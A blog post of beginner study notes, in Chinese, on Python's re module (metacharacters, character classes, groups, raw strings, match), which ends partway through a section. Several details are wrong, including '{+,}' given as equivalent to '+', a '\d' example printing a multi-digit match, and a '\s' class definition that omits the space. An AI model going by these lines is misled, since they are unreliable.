<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>V&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:type" content="website">
<meta property="og:title" content="V&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="V&#39;s blog">
<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
  
    <link rel="alternate" href="/atom.xml" title="V&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">V&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Daily life of a rookie</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-python 正则" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/21/python 正则/" class="article-date">
  <time datetime="2019-07-21T14:30:35.000Z" itemprop="datePublished">2019-07-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/21/python 正则/">python 正则</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="python-正则"><a href="#python-正则" class="headerlink" title="python 正则"></a>python 正则</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前打CTF经常性的因为不会写脚本而去手撸，这大大降低了效率，而且有的题由于时间限制，显然手撸行不通。</p>
<p>而不会写脚本经常是因为自己不会处理得到的数据，如何过滤、拼接。所以今天学习一下python的re模块，正则替换，以及刚刚从Li4n0学长脚本中发现的字符表替换。</p>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><h4 id="元字符"><a href="#元字符" class="headerlink" title="^元字符"></a>^元字符</h4><p>字符串开始位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配s规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<p>[^a-z]反取，</p>
<p>匹配出除字母外的字符，^元字符如果写到字符集里就是反取</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"[^a-z]"</span>, <span class="string">"匹配s规则这s个字符串是否s匹配f规则则re则则则"</span>)   <span class="comment">#反取，匹配出除字母外的字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-1"><a href="#元字符-1" class="headerlink" title="$元字符"></a>$元字符</h4><p>字符串结束位置与匹配规则符合就匹配，否则不匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;a = re.findall(<span class="string">"匹配规则$"</span>, <span class="string">"这个字符串是否匹配规则"</span>)   <span class="comment">#字符串结束位置与匹配规则符合就匹配，否则不匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(a)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-2"><a href="#元字符-2" class="headerlink" title="*元字符"></a>*元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的*元字符）前面的一个字符可以是0个或多个原本字符</p>
<p>匹配前一个字符0或多次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<p>如果规则里只有一个分组，尽量避免用*否则会有可能匹配出空字符串</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则则则则则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"whether this string is matching?"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<h4 id="元字符-3"><a href="#元字符-3" class="headerlink" title="+元字符"></a>+元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</p>
<p>匹配前一个字符1次或无限次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配+"</span>, <span class="string">"匹配配配配配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配配配配配'</span>, <span class="string">'匹配'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，和防止贪婪匹配"><a href="#元字符，和防止贪婪匹配" class="headerlink" title="?元字符，和防止贪婪匹配"></a>?元字符，和防止贪婪匹配</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</p>
<p>匹配一个字符0次或1次</p>
<p>还有一个功能是可以防止贪婪匹配，详情见防贪婪匹配</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则?"</span>, <span class="string">"匹配规这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规'</span>, <span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'my title="sw engineer". His is "hello world"'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*?)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 如果没有 ?， 则会抓到最长的两个双引号之间的内容</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw enginee<span class="string">r". His is "</span>hello world</span><br></pre></td></tr></table></figure>



<h4 id="元字符-范围"><a href="#元字符-范围" class="headerlink" title="{}元字符,范围"></a>{}元字符,范围</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 {} 元字符）前面的一个字符，是自定义字符数，位数的原本字符</p>
<p>{m}匹配前一个字符m次，{m,n}匹配前一个字符m至n次，若省略n，则匹配m至无限次</p>
<p>{0,}匹配前一个字符0或多次,等同于*元字符<br>{+,}匹配前一个字符1次或无限次,等同于+元字符<br>{0,1}匹配前一个字符0次或1次,等同于?元字符</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;result = re.findall(<span class="string">"匹配规则&#123;3&#125;"</span>, <span class="string">"匹配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#&#123;m&#125;匹配前一个字符m次，&#123;m,n&#125;匹配前一个字符m至n次，若省略n，则匹配m至无限次</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">打印出 [<span class="string">'匹配规则则则'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="元字符-字符集"><a href="#元字符-字符集" class="headerlink" title="[]元字符,字符集"></a>[]元字符,字符集</h3><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</p>
<p>字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]。[^abc]表示取反，即非abc。所有特殊字符在字符集中都失去其原有的特殊含义。用\反斜杠转义 <strong>恢复</strong> 特殊字符的特殊含义。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则"</span>, <span class="string">"匹配a规则这个字符串是否匹配b规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配a规则'</span>, <span class="string">'匹配b规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则\t"</span>, <span class="string">"匹配a规则	这个字符串是否匹配b规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配a规则\t'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"><a href="#反斜杠后边跟普通字符实现特殊功能；（即预定义字符）" class="headerlink" title="反斜杠后边跟普通字符实现特殊功能；（即预定义字符）"></a>反斜杠后边跟普通字符实现特殊功能；（即预定义字符）</h4><p>预定义字符是在字符集和组里都是有用的</p>
<p>\d匹配任何十进制数，它相当于类[0-9]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure>

<p>\d+如果需要匹配一位或者多位数的数字时用</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\d匹配任何十进制数，它相当于类[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'33'</span>,  <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure>

<p>\D匹配任何非数字字符，它相当于类[^0-9]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\D"</span>, <span class="string">"匹配规则这2个字符串33是否匹配规则5则则则7则"</span>)   <span class="comment">#\D匹配任何非十进制数，它相当于类[^0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<p>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\s"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\s匹配任何空白字符，它相当于类[\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'\t'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">'\n'</span>]</span><br></pre></td></tr></table></figure>

<p>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\S"</span>, <span class="string">"匹配规则   这2个字符串3是否匹\n配规则5则则则7则"</span>)   <span class="comment">#\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'2'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'3'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'5'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'7'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure>

<p>\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\w'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'h'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'p'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'c'</span>, <span class="string">'n'</span>, <span class="string">'b'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'g'</span>, <span class="string">'s'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure>

<p>\W匹配非任何字母数字字符包括下划线在内，它相当于类[^a-zA-Z0-9_]</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\W'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\W不匹配包括下划线在内任何字母数字字符，它相当于类[^a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，分组"><a href="#元字符，分组" class="headerlink" title="()元字符，分组"></a>()元字符，分组</h4><p>也就是分组匹配，()里面的为一个组也可以理解成一个整体</p>
<p>如果()后面跟的是特殊元字符如   (adc)*   那么*控制的前导字符就是()里的整体内容，不再是前导一个字符</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="comment">#也就是分组匹配，()里面的为一个组也可以理解成一个整体</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"(a4)+"</span>, <span class="string">"a4a4a4a4a4dg4g654gb"</span>)   <span class="comment">#匹配一个或多个a4</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"a(\d+)"</span>,<span class="string">"a45646148a49a4a456048a45gg"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">9</span>), match=<span class="string">'a45646148'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure>

<h4 id="元字符，或"><a href="#元字符，或" class="headerlink" title="|元字符，或"></a>|元字符，或</h4><p>|或，或就是前后其中一个符合就匹配</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"你|好"</span>, <span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)   <span class="comment">#|或，或就是前后其中一个符合就匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'你'</span>, <span class="string">'好'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a4a4a你|好dg4g654"</span>,<span class="string">"a4a4a你4aabc4a4dgg好dg4g654g"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a4a4a你'</span>, <span class="string">'好dg4g654'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="r原生字符"><a href="#r原生字符" class="headerlink" title="r原生字符"></a>r原生字符</h4><p>将在python里有特殊意义的字符如\b，转换成原生字符（就是去除它在python的特殊意义），不然会给正则表达式有冲突，为了避免这种冲突可以在规则前加原始字符r</p>
<p>(这里还有点问题，结果不太懂，为啥第一个不输出 [a\b] )</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a\x08'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(“rule”,string)</p>
<h4 id="1-match-方法-从字符串头部开始匹配"><a href="#1-match-方法-从字符串头部开始匹配" class="headerlink" title="1. match()方法, 从字符串头部开始匹配"></a>1. match()方法, 从字符串头部开始匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-匹配目标"><a href="#2-匹配目标" class="headerlink" title="2. 匹配目标"></a>2. 匹配目标</h4><p>在正则表达式中用()括起来可以使用group()输出, 若有n个(), 那么可以表示为group(n), 输出第n个括号匹配的内容.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s(\d+)\sis'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.group(<span class="number">1</span>)) <span class="comment">#输出第一个被()包裹的内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
